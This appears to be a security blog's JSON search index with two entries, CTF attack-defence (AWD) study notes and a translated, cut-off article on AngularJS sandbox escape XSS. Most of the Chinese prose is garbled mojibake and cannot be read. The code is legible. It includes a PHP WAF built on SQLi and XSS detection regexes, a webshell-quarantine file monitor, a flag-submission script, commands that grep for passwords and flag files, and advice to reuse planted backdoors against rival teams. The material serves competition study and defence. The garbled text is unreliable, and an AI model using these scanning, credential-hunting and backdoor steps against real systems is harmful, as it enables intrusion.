[{"title":"Web_ç•ªå¤–ç¯‡_AWDèŠå£«","url":"/2023/04/25/AWD/","content":"ç”±äºæˆ‘å¯¹äºŒè¿›åˆ¶ä¸€çªä¸é€š, è¿™é‡Œä»¥web_awdä¸ºä¸», è¿™ä¹Ÿä¸æ˜¯æˆ‘çš„æ•™ç¨‹, è€Œæ˜¯å‚è€ƒäº†å…¶ä»–å¤§ä½¬æ–‡ç« åšçš„ç¬”è®°è¿™é‡Œä¸»è¦å‚è€ƒäº†ä¸¤ä½å¤§ä½¬nul1å’Œå“ˆå–½æ²ƒå¾·erçš„ä¸¤ç¯‡æ–‡ç« \nç®€ä»‹AWD: Attack With Defence, å¼ºè°ƒæ”»é˜²/å®æˆ˜/å¯¹æŠ—, ç»¼åˆè€ƒé‡é˜Ÿä¼çš„æ¸—é€èƒ½åŠ›å’Œé˜²æŠ¤èƒ½åŠ›\næ¯”èµ›ä¸­, æ¯ä¸ªé˜Ÿä¼ç»´æŠ¤å¤šå°æœåŠ¡å™¨, æœåŠ¡å™¨ä¸­å­˜åœ¨å¤šä¸ªæ¼æ´, åˆ©ç”¨æ¼æ´æ”»å‡»å…¶ä»–é˜Ÿä¼å°±å¯ä»¥è¿›è¡Œå¾—åˆ†, ä¿®å¤æ¼æ´é¿å…å…¶ä»–é˜Ÿä¼æ”»å‡»å¯ä»¥é˜²æ­¢ä¸¢åˆ†\n\nä¸€èˆ¬åˆ†é…webæœåŠ¡å™¨(å¤šæ•°ä¸ºLinux) æŸå¤„å­˜åœ¨flag(ä¸€èˆ¬åœ¨æ ¹ç›®å½•ä¸‹)\nè‚¯èƒ½ä¼šæä¾›ä¸€å°æµé‡åˆ†æè™šæ‹Ÿæœº, å¯ä»¥ä¸‹è½½æµé‡æ–‡ä»¶è¿›è¡Œæ•°æ®åˆ†æ\nflagåœ¨ä¸»åŠæ–¹çš„è®¾å®šä¸‹æ¯éš”ä¸€å®šæ—¶é—´åˆ·æ–°ä¸€è½®\nå„é˜Ÿä¸€èˆ¬æœ‰è‡ªå·±çš„åˆå§‹åˆ†æ•°\nflagè¢«å…¶ä»–é˜Ÿä¼æ‹¿èµ°, è¯¥é˜Ÿå°±ä¼šæ‰£é™¤ä¸€å®šç§¯åˆ†\næ‰£é™¤çš„ç§¯åˆ†ç”±è·å–flagçš„é˜Ÿä¼å‡åˆ†\nä¸»åŠæ–¹ä¼šå¯¹æ¯ä¸ªé˜Ÿä¼çš„æœåŠ¡è¿›è¡Œcheck, æœåŠ¡å™¨å®•æœºæ‰£é™¤æœ¬è½®flagåˆ†æ•°, æ‰£é™¤çš„åˆ†æ•°ç”±æœåŠ¡checkæ­£å¸¸çš„é˜Ÿä¼å‡åˆ†\nä¸€èˆ¬æ¯ä¸ªé˜Ÿä¼ä¼šç»™ä¸€ä¸ªä½æƒé™ç”¨æˆ·, érootæƒé™\n\nç½‘ç»œæƒ…å†µ\næ¯”èµ›ä¸­è·å–flagä¸€èˆ¬æœ‰ä¸¤ç§æ¨¡å¼\n\nflagåœ¨æ ¹ç›®å½•ä¸‹, è¯»å–flagå†…å®¹æäº¤å³å¯å¾—åˆ†\næ‹¿åˆ°å…¶ä»–é˜Ÿä¼çš„shellå, æ‰§è¡ŒæŒ‡å®šå‘½ä»¤curl 10.0.0.2å³å¯ä»ä¸Šå›¾flagæœºè·å–flagå†…å®¹\n\næ¯”èµ›å¯èƒ½ä¼šå‘Šè¯‰ä½ å…¶ä»–é˜Ÿä¼çš„IP, ä¹Ÿæœ‰å¯èƒ½ä¸å‘Šè¯‰ä½ , ä¸€èˆ¬å®åœ¨åŒä¸€ä¸ªCæ®µæˆ–è€…Bæ®µ, å¯ä»¥åˆ©ç”¨nmapç­‰æ”»å‡»æ‰«æå‘ç°å…¶ä»–é˜Ÿä¼çš„IP\nnmap -sn 192.168.71.0/24\n\næˆ–è€…ç”¨https://github.com/zer0h/httpscan çš„è„šæœ¬è¿›è¡Œæ‰«æ\næ¯”èµ›å¥—è·¯å¼±å£ä»¤ä¿®æ”¹å¼±å£ä»¤å¯†ç , ä¸»åŠæ–¹è®¾ç½®çš„å¯†ç ææœ‰å¯èƒ½æ—¶å¼±å£ä»¤, åŒ…æ‹¬ä½†ä¸é™äºssh/phpcms/wordpress, éœ€è¦ç«‹å³ä¿®æ”¹å£ä»¤, æ”¹å®Œè‡ªå·±é˜Ÿä¼çš„ä¹‹åå¯ä»¥çœ‹ä¸€ä¸‹å…¶ä»–é˜Ÿä¼çš„æœ‰æ²¡æœ‰ä¿®æ”¹. \nä¸è¿‡, æœ‰äº›æ¯”èµ›ä¸å…è®¸ä¿®æ”¹åå°å£ä»¤, å¦‚æœä¿®æ”¹è§†ä¸ºæœåŠ¡å™¨å®•æœº\nå¤‡ä»½æºç å¹¶æŸ¥æ‰¾é¢„ç•™åé—¨å¤‡ä»½æºç , æ¯”èµ›å¼€å§‹ç¬¬ä¸€ä»¶äº‹å°±æ˜¯å¤‡ä»½æºç , å°†ç½‘ç«™æºç ä¸‹è½½åå¤åˆ¶ä¸€ä¸‹, ç”¨Dç›¾æ‰«æä¸€ä»½é¢„ç•™ä¸€ä»½é˜²æ­¢å®•æœº, Dç›¾æ‰«æåä¹Ÿä¼šå‘ç°ä¸€äº›é¢„ç•™åé—¨, ç¬¬ä¸€æ—¶é—´åˆ é™¤åé—¨å, ç„¶ååˆ©ç”¨è¿™ä¸ªåé—¨å‘èµ·ä¸€æ³¢æ”»å‡»\næ•°æ®åº“å¤‡ä»½ç™»å½•æ•°æ®åº“å¤‡ä»½, å½“æ•°æ®è¢«åˆ é™¤çš„æ—¶å€™å¯ä»¥ä½¿ç”¨å‘½ä»¤å¿«é€Ÿè¿˜åŸ\nmysqldump -u db_user -p db_passwd db_name &gt; 1.sql //å¤‡ä»½æŒ‡å®šæ•°æ®åº“ \n\nè¿˜åŸå‘½ä»¤\nmysql -u db_user -p db_passwd db_name &lt; 1.sql //è¿˜åŸæŒ‡å®šæ•°æ®åº“ \n\nå…³é—­ä¸å¿…è¦çš„ç«¯å£ä¸€äº›ç«¯å£ä¼šå­˜åœ¨æ¼æ´, ä¸ºäº†ä¿è¯å®‰å…¨, æˆ‘ä»¬å…³é—­ä¸€äº›ä¸å¿…è¦çš„ç«¯å£\n\néƒ¨ç½²WAFè¿™é‡Œæ¨èä¸€ä¸ªAoiAWD\nCTFDefense\nä½†æ˜¯è¿™é‡Œè¦æ³¨æ„è§„åˆ™æ˜¯å¦å…è®¸ç¬¬ä¸‰æ–¹é€šé˜²\nä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ª\n&lt;?php//Code By Safe3 function customError($errno, $errstr, $errfile, $errline)&#123;  echo &quot;&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;&quot;; die();&#125;set_error_handler(&quot;customError&quot;,E_ERROR);$getfilter=&quot;&#x27;|(and|or)\\\\b.+?(&gt;|&lt;|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;;$postfilter=&quot;\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;;$cookiefilter=&quot;\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;;function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq)&#123;  if(is_array($StrFiltValue))&#123;    $StrFiltValue=implode($StrFiltValue);&#125;  if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,$StrFiltValue)==1)&#123;           //slog(&quot;&lt;br&gt;&lt;br&gt;æ“ä½œIP: &quot;.$_SERVER[&quot;REMOTE_ADDR&quot;].&quot;&lt;br&gt;æ“ä½œæ—¶é—´: &quot;.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;).&quot;&lt;br&gt;æ“ä½œé¡µé¢:&quot;.$_SERVER[&quot;PHP_SELF&quot;].&quot;&lt;br&gt;æäº¤æ–¹å¼: &quot;.$_SERVER[&quot;REQUEST_METHOD&quot;].&quot;&lt;br&gt;æäº¤å‚æ•°: &quot;.$StrFiltKey.&quot;&lt;br&gt;æäº¤æ•°æ®: &quot;.$StrFiltValue);        print &quot;360websec notice:Illegal operation!&quot;;        exit();&#125;      &#125;  //$ArrPGC=array_merge($_GET,$_POST,$_COOKIE);foreach($_GET as $key=&gt;$value)&#123;     StopAttack($key,$value,$getfilter);&#125;foreach($_POST as $key=&gt;$value)&#123;     StopAttack($key,$value,$postfilter);&#125;foreach($_COOKIE as $key=&gt;$value)&#123;     StopAttack($key,$value,$cookiefilter);&#125;if (file_exists(&#x27;update360.php&#x27;)) &#123;    echo &quot;è¯·é‡å‘½åæ–‡ä»¶update360.phpï¼Œé˜²æ­¢é»‘å®¢åˆ©ç”¨&lt;br/&gt;&quot;;    die();&#125;function slog($logs)&#123;  $toppath=$_SERVER[&quot;DOCUMENT_ROOT&quot;].&quot;/log.htm&quot;;  $Ts=fopen($toppath,&quot;a+&quot;);  fputs($Ts,$logs.&quot;\\r\\n&quot;);  fclose($Ts);&#125;?&gt;\n\nä½¿ç”¨æ–¹æ³•:\n\nå°†waf.phpä¼ åˆ°åŒ…å«çš„æ–‡ä»¶ç›®å½•\nåœ¨é¡µé¢ä¸­åŠ å…¥é˜²æŠ¤, æœ‰ä¸¤ç§åšæ³•, æ ¹æ®æƒ…å†µäºŒé€‰ä¸€å³å¯\n\nåœ¨é¦–é¡µé¢åŠ å…¥ä»£ç \nrequire_once(&#x27;waf.php&#x27;);\n\nå°±å¯ä»¥åšåˆ°é¡µé¢é˜²æ³¨å…¥ã€è·¨ç«™å¦‚æœæƒ³æ•´ç«™é˜²æ³¨ï¼Œå°±åœ¨ç½‘ç«™çš„ä¸€ä¸ªå…¬ç”¨æ–‡ä»¶ä¸­ï¼Œå¦‚æ•°æ®åº“é“¾æ¥æ–‡ä»¶config.inc.phpä¸­ï¼æ·»åŠ require_once(â€˜waf.phpâ€™);æ¥è°ƒç”¨æœ¬ä»£ç å¸¸ç”¨phpç³»ç»Ÿæ·»åŠ æ–‡ä»¶\nPHPCMS V9   \\phpcms\\base.phpPHPWIND8.7  \\data\\sql_config.phpDEDECMS5.7  \\data\\common.inc.phpDiscuzX2    \\config\\config_global.phpWordpress   \\wp-config.phpMetinfo     \\include\\head.php\n\nåœ¨æ¯ä¸ªæ–‡ä»¶æœ€å‰åŠ ä¸Šä»£ç åœ¨php.iniä¸­æ‰¾åˆ°:\nAutomatically add files before or after any PHP document.auto_prepend_file = 360_safe3.phpè·¯å¾„;\n\néœ€è¦æ³¨æ„çš„æ˜¯, éƒ¨ç½²wafå¯èƒ½ä¼šå¯¼è‡´æœåŠ¡ä¸å¯ç”¨, éœ€è¦è°¨æ…éƒ¨ç½²\næ–‡ä»¶ç›‘æ§\n# -*- coding: utf-8 -*-#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = &#123;&#125;      # æ–‡ä»¶MD5å­—å…¸ORIGIN_FILE_LIST = []# ç‰¹æ®Šæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²Special_path_str = &#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;bakstring = &#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;logstring = &#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;webshellstring = &#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;difffile = &#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;Special_string = &#x27;drops_log&#x27;  # å…æ­»é‡‘ç‰ŒUNICODE_ENCODING = &quot;utf-8&quot;INVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;# æ–‡ä»¶è·¯å¾„å­—å…¸spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = &#123;    &#x27;bak&#x27; : os.path.realpath(os.path.join(spec_base_path, bakstring)),    &#x27;log&#x27; : os.path.realpath(os.path.join(spec_base_path, logstring)),    &#x27;webshell&#x27; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),    &#x27;difffile&#x27; : os.path.realpath(os.path.join(spec_base_path, difffile)),&#125;def isListLike(value):    return isinstance(value, (list, tuple, set))# è·å–Unicodeç¼–ç def getUnicode(value, encoding=None, noneToNull=False):    if noneToNull and value is None:        return NULL    if isListLike(value):        value = list(getUnicode(_, encoding, noneToNull) for _ in value)        return value    if isinstance(value, unicode):        return value    elif isinstance(value, basestring):        while True:            try:                return unicode(value, encoding or UNICODE_ENCODING)            except UnicodeDecodeError, ex:                try:                    return unicode(value, UNICODE_ENCODING)                except:                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]    else:        try:            return unicode(value)        except UnicodeDecodeError:            return unicode(str(value), errors=&quot;ignore&quot;)# ç›®å½•åˆ›å»ºdef mkdir_p(path):    import errno    try:        os.makedirs(path)    except OSError as exc:        if exc.errno == errno.EEXIST and os.path.isdir(path):            pass        else: raise# è·å–å½“å‰æ‰€æœ‰æ–‡ä»¶è·¯å¾„def getfilelist(cwd):    filelist = []    for root,subdirs, files in os.walk(cwd):        for filepath in files:            originalfile = os.path.join(root, filepath)            if Special_path_str not in originalfile:                filelist.append(originalfile)    return filelist# è®¡ç®—æœºæ–‡ä»¶MD5å€¼def calcMD5(filepath):    try:        with open(filepath,&#x27;rb&#x27;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())            hash = md5obj.hexdigest()            return hash    except Exception, e:        print u&#x27;[!] getmd5_error : &#x27; + getUnicode(filepath)        print getUnicode(e)        try:            ORIGIN_FILE_LIST.remove(filepath)            FILE_MD5_DICT.pop(filepath, None)        except KeyError, e:            pass# è·å–æ‰€æœ‰æ–‡ä»¶MD5def getfilemd5dict(filelist = []):    filemd5dict = &#123;&#125;    for ori_file in filelist:        if Special_path_str not in ori_file:            md5 = calcMD5(os.path.realpath(ori_file))            if md5:                filemd5dict[ori_file] = md5    return filemd5dict# å¤‡ä»½æ‰€æœ‰æ–‡ä»¶def backup_file(filelist=[]):    # if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:    for filepath in filelist:        if Special_path_str not in filepath:            shutil.copy2(filepath, Special_path[&#x27;bak&#x27;])if __name__ == &#x27;__main__&#x27;:    print u&#x27;---------start------------&#x27;    for value in Special_path:        mkdir_p(Special_path[value])    # è·å–æ‰€æœ‰æ–‡ä»¶è·¯å¾„ï¼Œå¹¶è·å–æ‰€æœ‰æ–‡ä»¶çš„MD5ï¼ŒåŒæ—¶å¤‡ä»½æ‰€æœ‰æ–‡ä»¶    ORIGIN_FILE_LIST = getfilelist(CWD)    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)    backup_file(ORIGIN_FILE_LIST) # TODO å¤‡ä»½æ–‡ä»¶å¯èƒ½ä¼šäº§ç”Ÿé‡åBUG    print u&#x27;[*] pre work end!&#x27;    while True:        file_list = getfilelist(CWD)        # ç§»é™¤æ–°ä¸Šä¼ æ–‡ä»¶        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))        if len(diff_file_list) != 0:            # import pdb;pdb.set_trace()            for filepath in diff_file_list:                try:                    f = open(filepath, &#x27;r&#x27;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#x27;[*] webshell find : &#x27; + getUnicode(filepath)                        shutil.move(filepath, os.path.join(Special_path[&#x27;webshell&#x27;], ntpath.basename(filepath) + &#x27;.txt&#x27;))                    except Exception as e:                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filepath)                    try:                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)                        f.write(&#x27;newfile: &#x27; + getUnicode(filepath) + &#x27; : &#x27; + str(time.ctime()) + &#x27;\\n&#x27;)                        f.close()                    except Exception as e:                        print u&#x27;[-] log error : file move error: &#x27; + getUnicode(e)        # é˜²æ­¢ä»»æ„æ–‡ä»¶è¢«ä¿®æ”¹,è¿˜åŸè¢«ä¿®æ”¹æ–‡ä»¶        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)        for filekey in md5_dict:            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:                try:                    f = open(filekey, &#x27;r&#x27;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#x27;[*] file had be change : &#x27; + getUnicode(filekey)                        shutil.move(filekey, os.path.join(Special_path[&#x27;difffile&#x27;], ntpath.basename(filekey) + &#x27;.txt&#x27;))                        shutil.move(os.path.join(Special_path[&#x27;bak&#x27;], ntpath.basename(filekey)), filekey)                    except Exception as e:                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filekey)                    try:                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)                        f.write(&#x27;diff_file: &#x27; + getUnicode(filekey) + &#x27; : &#x27; + getUnicode(time.ctime()) + &#x27;\\n&#x27;)                        f.close()                    except Exception as e:                        print u&#x27;[-] log error : done_diff: &#x27; + getUnicode(filekey)                        pass        time.sleep(2)        # print &#x27;[*] &#x27; + getUnicode(time.ctime())\n\næ‰¹é‡è„šæœ¬æ¯”èµ›ä¸­æˆ‘ä»¬çš„å¯¹æ‰‹ä¸æ­¢æœ‰ä¸€ä¸ª, è¿™é‡Œå°±éœ€è¦æˆ‘ä»¬æ‰¹é‡getshell, æ‰¹é‡æäº¤flag\nå°±åƒä¸Šé¢æ‰€è¯´çš„é¢„ç•™åé—¨, ä¸éœ€è¦ä¸“é—¨å»æ‰“, å¯ä»¥ç›´æ¥æ‰¹é‡getshell\nå¯ä»¥ä½¿ç”¨discuz-ml-rce\nflagä¹Ÿæ˜¯æ‰¹é‡æäº¤æ•ˆç‡æ‰ä¼šé«˜ä¸€äº›\n#!/usr/bin/env python2import sysimport jsonimport urllibimport httplibserver_host = &#x27;10.10.0.2&#x27;server_port = 80def submit(team_token, flag, host=server_host, port=server_port, timeout=5):    if not team_token or not flag:        raise Exception(&#x27;team token or flag not found&#x27;)    conn = httplib.HTTPConnection(host, port, timeout=timeout)    params = urllib.urlencode(&#123;        &#x27;token&#x27;: team_token,        &#x27;flag&#x27;: flag,    &#125;)    headers = &#123;        &quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;    &#125;    conn.request(&#x27;POST&#x27;, &#x27;/api/submit_flag&#x27;, params, headers)    response = conn.getresponse()    data = response.read()    return json.loads(data)if __name__ == &#x27;__main__&#x27;:    if len(sys.argv) &lt; 3:        print &#x27;usage: ./submitflag.py $team_token $flag&#x27;        sys.exit()    host = server_host    if len(sys.argv) &gt; 3:        host = sys.argv[3]    print json.dumps(submit(sys.argv[1], sys.argv[2], host=host), indent=4)\n\næµé‡æ—¥å¿—é€šè¿‡æµé‡ã€æ—¥å¿—çš„åˆ†æï¼š\n1.æ„ŸçŸ¥å¯èƒ½æ­£åœ¨å‘ç”Ÿçš„æ”»å‡»ï¼Œä»è€Œè§„é¿å­˜åœ¨çš„å®‰å…¨é£é™©\n2.åº”æ€¥å“åº”ï¼Œè¿˜åŸæ”»å‡»è€…çš„æ”»å‡»è·¯å¾„ï¼Œä»è€ŒæŒ½å›å·²ç»é€ æˆçš„æŸå¤±\n3.å­¦ä¹ åˆ«äººçš„æ”»å‡»æ–¹æ³•\nåŸºäºæµé‡ç›‘æ§æ¥å®ç°ï¼Œä¸€ä¸ªç®€å•çš„è„šæœ¬å¦‚ä¸‹ï¼š\n&lt;?phpdate_default_timezone_set(&#x27;Asia/Shanghai&#x27;);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //è®°å½•è®¿é—®è€…çš„ip$filename = $_SERVER[&#x27;PHP_SELF&#x27;]; //è®¿é—®è€…è¦è®¿é—®çš„æ–‡ä»¶å$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //è®¿é—®è€…è¦è¯·æ±‚çš„å‚æ•°$time = date(&#x27;Y-m-d H:i:s&#x27;,time()); //è®¿é—®æ—¶é—´$logadd = &#x27;æ¥è®¿æ—¶é—´ï¼š&#x27;.$time.&#x27;--&gt;&#x27;.&#x27;è®¿é—®é“¾æ¥ï¼š&#x27;.&#x27;http://&#x27;.$ip.$filename.&#x27;?&#x27;.$parameter.&quot;\\r\\n&quot;;// logè®°å½•$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt; \n\næ‰‹å·¥é˜²å¾¡find / -name *flag* #æŸ¥æ‰¾flagä½ç½®\n\nfind .|xargs grep &quot;password&quot; #æŸ¥æ‰¾password\n\nnetstat -antulp | grep EST #æŸ¥çœ‹ä»¥å»ºç«‹çš„è¿æ¥å’Œè¿›ç¨‹\n\nkill PID killall &lt;è¿›ç¨‹å&gt; #ç»“æŸè¿›ç¨‹\n\nnetstat -ant|awk|grep |sed -e-e |sort|uniq -c|sort -rn #æ£€æµ‹TCPè¿æ¥æ•°é‡\n\nchattr +i /etc/resolv.conf #chattrå‘½ä»¤é˜²æ­¢ç³»ç»Ÿä¸­æŸä¸ªå…³é”®æ–‡ä»¶è¢«ä¿®æ”¹\n\n","tags":["Web","Study","PHP","AWD"]},{"title":"æ²¡æœ‰ HTML çš„ XSSï¼šä½¿ç”¨ AngularJS çš„å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥","url":"/2022/05/12/AngularJS%20xss/","content":"æ–‡ç« å¼•ç”¨è‡ªï¼šhttps://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs\nç ”ç©¶å‘˜åŠ é›·æ–¯Â·æµ·è€¶æ–¯\n@garethheyes(è“é¸Ÿ)\næŠ½è±¡çš„å¯¹æå—æ¬¢è¿çš„ JavaScript æ¡†æ¶AngularJSçš„å¤©çœŸä½¿ç”¨å°†è®¸å¤šç½‘ç«™æš´éœ²ç»™ Angular æ¨¡æ¿æ³¨å…¥ã€‚è¿™ç§ç›¸å¯¹ä½è°ƒçš„æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥å…„å¼Ÿå¯ä»¥ä¸ Angular æ²™ç®±é€ƒé€¸ç›¸ç»“åˆï¼Œä»¥åœ¨å…¶ä»–å®‰å…¨ç«™ç‚¹ä¸Šå‘èµ·è·¨ç«™ç‚¹è„šæœ¬( XSS ) æ”»å‡»ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œè¿˜æ²¡æœ‰å…¬å¼€çš„æ²™ç›’é€ƒé€¸ä¼šå½±å“ Angular 1.3.1+ å’Œ 1.4.0+ã€‚è¿™ç¯‡æ–‡ç« å°†æ€»ç»“ Angular æ¨¡æ¿æ³¨å…¥çš„æ ¸å¿ƒæ¦‚å¿µï¼Œç„¶åå±•ç¤ºå½±å“æ‰€æœ‰ç°ä»£ Angular ç‰ˆæœ¬çš„æ–°æ²™ç®±é€ƒé€¸çš„å¼€å‘ã€‚\nä»‹ç»AngularJS æ˜¯ Google ç¼–å†™çš„ MVC å®¢æˆ·ç«¯æ¡†æ¶ã€‚ä½¿ç”¨ Angularï¼Œæ‚¨é€šè¿‡ view-source æˆ– Burp çœ‹åˆ°çš„åŒ…å«â€œng-appâ€çš„ HTML é¡µé¢å®é™…ä¸Šæ˜¯æ¨¡æ¿ï¼Œå¹¶å°†ç”± Angular å‘ˆç°ã€‚è¿™æ„å‘³ç€å¦‚æœç”¨æˆ·è¾“å…¥ç›´æ¥åµŒå…¥åˆ°é¡µé¢ä¸­ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å®¹æ˜“å—åˆ°å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥çš„æ”»å‡»ã€‚å³ä½¿ç”¨æˆ·è¾“å…¥æ˜¯ HTML ç¼–ç çš„å¹¶ä¸”åœ¨å±æ€§å†…ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\nAngular æ¨¡æ¿å¯ä»¥åŒ…å«è¡¨è¾¾å¼ â€”â€”åŒèŠ±æ‹¬å·å†…çš„ç±»ä¼¼ JavaScript çš„ä»£ç ç‰‡æ®µã€‚è¦äº†è§£å®ƒä»¬æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹ jsfiddleï¼š\nhttp://jsfiddle.net/2zs2yv7o/\næ–‡æœ¬è¾“å…¥ 2 ç”± Angular è¯„ä¼°ï¼Œç„¶åæ˜¾ç¤ºè¾“å‡ºï¼š2ã€‚\nè¿™æ„å‘³ç€ä»»ä½•èƒ½å¤Ÿæ³¨å…¥åŒèŠ±æ‹¬å·çš„äººéƒ½å¯ä»¥æ‰§è¡Œ Angular è¡¨è¾¾å¼ã€‚Angular è¡¨è¾¾å¼æœ¬èº«ä¸ä¼šé€ æˆå¤ªå¤§ä¼¤å®³ï¼Œä½†æ˜¯å½“ä¸æ²™ç®±é€ƒé€¸ç»“åˆä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»»æ„ JavaScript å¹¶é€ æˆä¸¥é‡ç ´åã€‚\nä»¥ä¸‹ä¸¤ä¸ªç‰‡æ®µæ˜¾ç¤ºäº†æ¼æ´çš„æœ¬è´¨ã€‚ç¬¬ä¸€ä¸ªé¡µé¢åŠ¨æ€åµŒå…¥ç”¨æˆ·è¾“å…¥ï¼Œä½†ä¸æ˜“å—åˆ° XSS æ”»å‡»ï¼Œå› ä¸ºå®ƒä½¿ç”¨htmlspecialcharså¯¹è¾“å…¥è¿›è¡Œ HTML ç¼–ç ï¼š\nä»¥ä¸‹ä¸¤ä¸ªç‰‡æ®µæ˜¾ç¤ºäº†æ¼æ´çš„æœ¬è´¨ã€‚ç¬¬ä¸€ä¸ªé¡µé¢åŠ¨æ€åµŒå…¥ç”¨æˆ·è¾“å…¥ï¼Œä½†ä¸æ˜“å—åˆ° XSS æ”»å‡»ï¼Œå› ä¸ºå®ƒä½¿ç”¨htmlspecialcharså¯¹è¾“å…¥è¿›è¡Œ HTML ç¼–ç ï¼š\n\nç¬¬äºŒé¡µå‡ ä¹ç›¸åŒï¼Œä½† Angular å¯¼å…¥æ„å‘³ç€å¯ä»¥é€šè¿‡æ³¨å…¥ Angular è¡¨è¾¾å¼æ¥åˆ©ç”¨å®ƒï¼Œå¹¶ä¸”é€šè¿‡æ²™ç®±é€ƒé€¸æˆ‘ä»¬å¯ä»¥è·å¾— XSSã€‚\n\nè¯·æ³¨æ„ï¼Œæ‚¨éœ€è¦åœ¨ DOM æ ‘ä¸­çš„è¡¨è¾¾å¼ä¸Šæ–¹æœ‰â€œng-appâ€ã€‚é€šå¸¸ï¼ŒAngular ç«™ç‚¹ä¼šåœ¨æ ¹ HTML æˆ– body æ ‡è®°ä¸­ä½¿ç”¨å®ƒã€‚\næ¢å¥è¯è¯´ï¼Œå¦‚æœä¸€ä¸ªé¡µé¢æ˜¯ä¸€ä¸ª Angular æ¨¡æ¿ï¼Œæˆ‘ä»¬å°†æ›´å®¹æ˜“å¯¹å®ƒè¿›è¡Œ XSS æ”»å‡»ã€‚åªæœ‰ä¸€ä¸ªé—®é¢˜ - æ²™ç›’ã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ‰ä¸€ä¸ªè§£å†³æ–¹æ¡ˆã€‚\næ²™ç›’Angular è¡¨è¾¾å¼è¢«æ²™ç›’åŒ–ï¼Œâ€œä»¥ä¿æŒåº”ç”¨ç¨‹åºèŒè´£çš„é€‚å½“åˆ†ç¦»â€ã€‚ä¸ºäº†åˆ©ç”¨ç”¨æˆ·ï¼Œæˆ‘ä»¬éœ€è¦çªç ´æ²™ç®±å¹¶æ‰§è¡Œä»»æ„ JavaScriptã€‚\nè®©æˆ‘ä»¬é‡ç”¨å‰é¢çš„å°æç´ï¼Œå¹¶åœ¨ Chrome çš„æºé€‰é¡¹å¡ä¸­çš„ angular.js å†…çš„ç¬¬ 13275 è¡Œæ”¾ç½®ä¸€ä¸ªæ–­ç‚¹ã€‚åœ¨ç›‘è§†çª—å£ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªæ–°çš„ç›‘è§†è¡¨è¾¾å¼â€œfnStringâ€ã€‚è¿™å°†æ˜¾ç¤ºæˆ‘ä»¬è½¬æ¢åçš„è¾“å‡ºã€‚1+1 è½¬æ¢ä¸ºï¼š\n&quot;use strict&quot;;var fn = function(s, l, a, i) &#123;  return plus(1, 1);&#125;;return fn;\n\næ‰€ä»¥è¡¨è¾¾å¼è¢«è§£æå’Œé‡å†™ï¼Œç„¶åç”± Angular 